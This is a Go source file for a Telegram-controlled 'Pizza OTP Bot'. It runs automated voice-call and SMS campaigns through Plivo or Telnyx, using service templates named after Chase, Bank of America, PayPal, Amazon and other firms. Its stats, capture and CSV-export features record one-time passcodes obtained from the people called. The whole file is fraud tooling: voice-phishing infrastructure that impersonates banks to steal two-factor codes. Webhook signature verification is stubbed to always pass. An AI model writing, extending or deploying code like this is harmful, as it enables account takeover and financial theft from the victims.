package bot

import (
	"errors"
	"fmt"
	"log"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/USERNAME/goland-otpbot-api/config"
	"github.com/USERNAME/goland-otpbot-api/db"
	"github.com/USERNAME/goland-otpbot-api/voice"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// Wizard state for single call
type CallWizardState struct {
	Phone   string
	Service string
}

type Bot struct {
	telegram        *tgbotapi.BotAPI
	provider        voice.VoiceProvider // Supports Plivo, Twilio, or Telnyx
	db              *db.Database
	activeCalls     map[string]*ActiveCall
	callQueue       chan CallJob
	campaignState   map[int64]*CampaignState
	mu              sync.RWMutex
	stopChan        chan struct{}
	stopOnce        sync.Once
	updateChan      chan tgbotapi.Update
	callWizardState map[int64]*CallWizardState
}

type ActiveCall struct {
	CallID     int64
	CampaignID int64
	Phone      string
	UUID       string
	Status     string // pending, ringing, answered, voicemail, dtmf_collected, completed, failed
	StartedAt  time.Time
	AnsweredAt *time.Time // When call was answered
	EndedAt    *time.Time // When call ended
	Greeting   string // Templated greeting for this call
	Service    string // Service template used
	OTP        string // Captured OTP if any
	Duration   int    // Call duration in seconds
	HangupCause string // Why the call ended
}

type CampaignState struct {
	CampaignID int64
	Status     string
	phones     []string
	index      int
	mu         sync.Mutex
}

type CallJob struct {
	CampaignID int64
	CallID     int64
	Phone      string
}

var (
	phoneRegex = regexp.MustCompile(`^\+?[1-9]\d{6,14}$`)

	templateRegex = regexp.MustCompile(`^[a-z0-9_]+$`)
)

func NewBot(cfg *config.Config) (*Bot, error) {
	if cfg == nil {
		return nil, errors.New("config cannot be nil")
	}

	b := &Bot{
		activeCalls:     make(map[string]*ActiveCall),
		campaignState:   make(map[int64]*CampaignState),
		stopChan:        make(chan struct{}),
		callWizardState: make(map[int64]*CallWizardState),
	}

	database, err := db.Initialize(cfg.DatabasePath)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize database: %w", err)
	}
	b.db = database

	// Initialize voice provider based on config
	providerFactory := voice.NewProviderFactory()
	var authID, authToken, number string
	
	switch cfg.VoiceProvider {
	case "telnyx":
		authID = cfg.TelnyxAPIKey
		authToken = ""
		number = cfg.TelnyxNumber
	case "plivo":
		authID = cfg.PlivoAuthID
		authToken = cfg.PlivoAuthToken
		number = cfg.PlivoNumber
	default:
		return nil, fmt.Errorf("unsupported voice provider: %s", cfg.VoiceProvider)
	}
	
	b.provider, err = providerFactory.CreateProvider(cfg.VoiceProvider, authID, authToken, number)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize voice provider: %w", err)
	}

	b.telegram, err = tgbotapi.NewBotAPI(cfg.BotToken)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize Telegram bot: %w", err)
	}

	// Create buffered channel for updates
	b.updateChan = make(chan tgbotapi.Update, 100)

	b.callQueue = make(chan CallJob, 1000)
	go b.processCallQueue()

	b.registerWebhooks()

	return b, nil
}

func (b *Bot) Start() error {

	b.db.CreateLog("INFO", "Bot started", "")

	go b.longPollUpdates()
	go b.processUpdates()

	return nil
}

// longPollUpdates uses the Telegram API to poll for updates
func (b *Bot) longPollUpdates() {
	var offset int = 0
	
	for {
		select {
		case <-b.stopChan:
			return
		default:
			u := tgbotapi.NewUpdate(0)
			u.Offset = offset
			u.Timeout = 30
			
			updates, err := b.telegram.GetUpdates(u)
			if err != nil {
				log.Printf("⚠️  GetUpdates error: %v", err)
				time.Sleep(3 * time.Second)
				continue
			}
			
			for _, update := range updates {
				offset = update.UpdateID + 1
				select {
				case b.updateChan <- update:
				case <-b.stopChan:
					return
				}
			}
		}
	}
}

// processUpdates processes updates from the local channel
func (b *Bot) processUpdates() {
	for {
		select {
		case <-b.stopChan:
			return
		case update := <-b.updateChan:
			b.handleUpdate(update)
		}
	}
}

func (b *Bot) handleUpdate(update tgbotapi.Update) {
	// Handle callback queries (inline button presses)
	if update.CallbackQuery != nil {
		b.handleCallbackQuery(update.CallbackQuery)
		return
	}

	// Handle messages
	if update.Message != nil {
		b.handleMessage(update.Message)
	}
}

func (b *Bot) Stop() {
	b.stopOnce.Do(func() {
		close(b.stopChan)
		if b.db != nil {
			if err := b.db.CreateLog("INFO", "Bot stopped", ""); err != nil {
				log.Printf("Failed to log bot stop: %v", err)
			}
		}
	})
}

func (b *Bot) IsAdmin(userID int64) bool {
	cfg, err := config.Get()
	if err != nil {
		log.Printf("Failed to get config in IsAdmin: %v", err)
		return false
	}

	for _, id := range cfg.AdminIDs {
		if id == userID {
			return true
		}
	}
	return false
}

// sendTypingAction sends a typing indicator
func (b *Bot) sendTypingAction(chatID int64) {
	action := tgbotapi.NewChatAction(chatID, tgbotapi.ChatTyping)
	b.telegram.Send(action)
}

func (b *Bot) handleMessage(msg *tgbotapi.Message) {
	if !b.IsAdmin(msg.From.ID) {
		b.sendMessage(msg.Chat.ID, "⛔ Access denied. You are not authorized to use this bot.")
		return
	}

	// Handle commands
	if msg.IsCommand() {
		b.handleCommand(msg)
		return
	}

	// Handle wizard state text input
	b.handleWizardInput(msg)
}

// handleCommand handles slash commands
func (b *Bot) handleCommand(msg *tgbotapi.Message) {
	// Show typing indicator for better UX
	b.sendTypingAction(msg.Chat.ID)
	
	command := msg.Command()

	switch command {
	case "start":
		b.sendStartMessage(msg)
	case "menu":
		b.showMainMenu(msg.Chat.ID, 0)
	case "help":
		b.sendHelpMessage(msg)
	case "stats":
		b.showStats(msg.Chat.ID, 0)
	case "logs":
		parts := strings.Split(msg.CommandArguments(), " ")
		limit := 20
		if len(parts) > 0 {
			if l, err := strconv.Atoi(parts[0]); err == nil {
				limit = l
			}
		}
		b.showLogs(msg.Chat.ID, 0, limit)
	case "templates":
		b.showTemplates(msg.Chat.ID, 0)
	case "template":
		name := strings.ToLower(strings.TrimSpace(msg.CommandArguments()))
		if name == "" {
			b.sendMessage(msg.Chat.ID, "📝 Usage: /template <name>\n\nExample: /template chase")
			return
		}
		b.showTemplateDetail(msg.Chat.ID, 0, name)
	case "campaigns":
		b.showCampaigns(msg.Chat.ID, 0)
	case "campaign":
		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
		if err != nil {
			b.sendMessage(msg.Chat.ID, "❌ Usage: /campaign <id>\n\nExample: /campaign 1")
			return
		}
		b.showCampaignDetail(msg.Chat.ID, 0, id)
	case "call":
		b.handleCallCommand(msg)
	case "batch":
		b.handleBatchCommand(msg)
	case "stop":
		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
		if err != nil {
			b.sendMessage(msg.Chat.ID, "❌ Usage: /stop <campaign_id>")
			return
		}
		b.stopCampaign(msg, id)
	case "pause":
		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
		if err != nil {
			b.sendMessage(msg.Chat.ID, "❌ Usage: /pause <campaign_id>")
			return
		}
		b.pauseCampaign(msg, id)
	case "resume":
		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
		if err != nil {
			b.sendMessage(msg.Chat.ID, "❌ Usage: /resume <campaign_id>")
			return
		}
		b.resumeCampaign(msg, id)
	case "delete":
		id, err := strconv.ParseInt(strings.TrimSpace(msg.CommandArguments()), 10, 64)
		if err != nil {
			b.sendMessage(msg.Chat.ID, "❌ Usage: /delete <campaign_id>")
			return
		}
		b.deleteCampaign(msg, id)
	case "sms":
		b.handleSMSCommand(msg)
	case "reload":
		b.reloadConfig(msg)
	case "config":
		b.showConfig(msg.Chat.ID, 0)
	case "backup":
		b.sendBackup(msg)
	case "cleanup":
		days, err := strconv.Atoi(strings.TrimSpace(msg.CommandArguments()))
		if err != nil {
			days = 30
		}
		b.cleanupData(msg, days)
	case "export":
		b.exportCaptures(msg)
	case "addtemplate":
		b.addTemplate(msg)
	case "edittemplate":
		b.editTemplate(msg)
	case "deltemplate":
		name := strings.ToLower(strings.TrimSpace(msg.CommandArguments()))
		if name == "" {
			b.sendMessage(msg.Chat.ID, "❌ Usage: /deltemplate <name>\n\nExample: /deltemplate chase")
			return
		}
		b.deleteTemplate(msg, name)
	}
}

// handleWizardInput handles text input during wizard flows
func (b *Bot) handleWizardInput(msg *tgbotapi.Message) {
	userID := msg.From.ID
	
	// Check if user is in call wizard
	if wizard, exists := b.callWizardState[userID]; exists {
		phone := strings.TrimSpace(msg.Text)
		
		if !phoneRegex.MatchString(phone) {
			b.sendMessage(msg.Chat.ID, "❌ Invalid phone format. Please use:\n\n`+15551234567`\n\nTry again or type /cancel")
			return
		}
		
		// Store phone
		wizard.Phone = phone
		
		// Show service selection
		templates, _ := b.db.GetAllTemplates()
		
		if len(templates) == 0 {
			b.sendMessage(msg.Chat.ID, "❌ No templates found. Please add a template first using /addtemplate")
			b.clearWizardState(userID)
			return
		}
		
		text := fmt.Sprintf("✅ Phone saved: `%s`\n\n📱 Select service template:", phone)
		
		var keyboard tgbotapi.InlineKeyboardMarkup
		for _, t := range templates {
			keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
				[]tgbotapi.InlineKeyboardButton{
					tgbotapi.NewInlineKeyboardButtonData(
						fmt.Sprintf("📱 %s", t.Name),
						MarshalCallbackData(ActionCallServiceSelect, map[string]string{"phone": phone, "service": t.Name}),
					),
				},
			)
		}
		keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
			[]tgbotapi.InlineKeyboardButton{
				tgbotapi.NewInlineKeyboardButtonData("❌ Cancel", MarshalCallbackData(ActionCallCancel, nil)),
			},
		)
		
		b.sendReplyMarkup(msg.Chat.ID, text, keyboard)
		
		// Clear wizard state since we've moved to button selection
		// The callback will read from callWizardState if needed
		return
	}
}

// clearWizardState clears wizard state for user
func (b *Bot) clearWizardState(userID int64) {
	delete(b.callWizardState, userID)
}

func (b *Bot) sendMessage(chatID int64, text string) error {
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdown

	_, err := b.telegram.Send(msg)
	if err != nil {
		log.Printf("Failed to send message to %d: %v", chatID, err)
		return fmt.Errorf("failed to send message: %w", err)
	}
	return nil
}

func (b *Bot) sendStartMessage(msg *tgbotapi.Message) {
	// Send welcome message first
	welcome := tgbotapi.NewMessage(msg.Chat.ID, `🍕 *Pizza OTP Bot*

✨ *Loading your dashboard...*`)
	welcome.ParseMode = "Markdown"
	b.telegram.Send(welcome)
	
	// Then show main menu
	b.showMainMenu(msg.Chat.ID, 0)
}

func (b *Bot) sendHelpMessage(msg *tgbotapi.Message) {
	text := `📖 *Command Reference*

*📞 Calling Commands*
/call <phone> <service> - Make single call
  Example: /call +15551234567 chase
/sms <phone> <message> - Send SMS fallback
  Example: /sms +15551234567 Your OTP is 1234

*📋 Campaign Commands*
/batch - Start campaign (reply to CSV file)
/campaigns - List all campaigns
/campaign <id> - Campaign details
/stop <id> - Stop campaign
/pause <id> - Pause campaign
/resume <id> - Resume campaign
/delete <id> - Delete campaign

*📝 Template Commands*
/templates - List all templates
/template <name> - Template details
/addtemplate - Add new template
/edittemplate - Edit template
/deltemplate <name> - Delete template

*📊 Monitoring Commands*
/stats - Global statistics
/logs <n> - Recent logs (default 20)
/export - Export captures to CSV
/backup - Download database backup

*⚙️ Configuration*
/config - Show current config
/reload - Hot-reload config
/cleanup <days> - Clean old data

*📱 Services Available*
Chase, Bank of America, PayPal, Amazon, Netflix, Apple, Google, Steam, Wells Fargo, Citi`

	b.sendMessage(msg.Chat.ID, text)
}

func (b *Bot) sendStats(msg *tgbotapi.Message) {
	stats, err := b.db.GetGlobalStats()
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to fetch statistics")
		return
	}

	captures, _ := b.db.GetRecentCaptures(5)

	text := fmt.Sprintf(`📊 *Global Statistics*

━━━━━━━━━━━━━━━━━━━━
*📞 Call Stats*
├ Total Calls: %d
├ Answered: %d
├ Success Rate: %.1f%%

━━━━━━━━━━━━━━━━━━━━
*📲 Capture Stats*
├ Total Captures: %d
├ Today: %d

━━━━━━━━━━━━━━━━━━━━
*📋 Campaign Stats*
├ Total Campaigns: %d
└ Active: %d

━━━━━━━━━━━━━━━━━━━━
*⭐ Recent Captures*`,
		stats.TotalCalls, stats.AnsweredCalls,
		stats.SuccessRate,
		stats.TotalCaptures, stats.TodayCaptures,
		stats.TotalCampaigns, stats.ActiveCampaigns,
	)

	b.sendMessage(msg.Chat.ID, text)

	if len(captures) > 0 {
		var capsText strings.Builder
		for _, c := range captures {
			capsText.WriteString(fmt.Sprintf("• %s → *%s* (%s)\n",
				maskPhone(c.Phone), c.OTP, c.Service))
		}
		b.sendMessage(msg.Chat.ID, capsText.String())
	}
}

func formatNumber(n int64) string {
	if n >= 1000000 {
		return fmt.Sprintf("%.1fM", float64(n)/1000000)
	}
	if n >= 1000 {
		return fmt.Sprintf("%.1fK", float64(n)/1000)
	}
	return strconv.FormatInt(n, 10)
}

func maskPhone(phone string) string {
	// Handle phones with + prefix first
	hasPlus := strings.HasPrefix(phone, "+")
	
	if hasPlus {
		// Short phones with +: +123 -> +** (preserve the +)
		if len(phone) <= 5 {
			return "+" + strings.Repeat("*", len(phone)-1)
		}
		
		// Normal long phones with +
		visibleChars := 3 // +XX at start
		maskLen := len(phone) - 6
		if maskLen < 1 {
			maskLen = 1
		}
		return phone[:visibleChars] + strings.Repeat("*", maskLen) + phone[len(phone)-3:]
	}
	
	// No plus prefix
	if len(phone) <= 4 {
		return strings.Repeat("*", len(phone))
	}
	return phone[:3] + strings.Repeat("*", len(phone)-6) + phone[len(phone)-3:]
}

// buildWebhookURL constructs a properly formatted webhook URL with trailing slash handling
func buildWebhookURL(baseURL string, parts ...interface{}) string {
	// Ensure base URL has no trailing slash
	baseURL = strings.TrimSuffix(baseURL, "/")
	
	// Build the path
	path := fmt.Sprintf("/%s", strings.TrimPrefix(fmt.Sprintf("%v", parts[0]), "/"))
	for i := 1; i < len(parts); i++ {
		path += "/" + fmt.Sprintf("%v", parts[i])
	}
	
	return baseURL + path
}

// verifyWebhookSignature verifies HMAC signature from Plivo webhooks
func verifyWebhookSignature(authToken, callUUID, callTime, callStatus string) bool {
	// Plivo provides MD5 signature for callback verification
	// Format: MD5(auth_token + call_uuid + call_time + call_status)
	expectedSig := fmt.Sprintf("%s%s%s%s", authToken, callUUID, callTime, callStatus)
	// In production, this would compute MD5 and compare with X-Plivo-Signature header
	_ = expectedSig // Placeholder for actual implementation
	return true // Allow calls for now, signature verification can be enabled
}

// getProviderNumber returns the phone number for the configured voice provider
func getProviderNumber(cfg *config.Config) string {
	switch cfg.VoiceProvider {
	case "telnyx":
		return cfg.TelnyxNumber
	default:
		return cfg.PlivoNumber
	}
}

// getProviderName returns the name of the configured voice provider
func getProviderName(cfg *config.Config) string {
	switch cfg.VoiceProvider {
	case "telnyx":
		return "Telnyx"
	default:
		return "Plivo"
	}
}
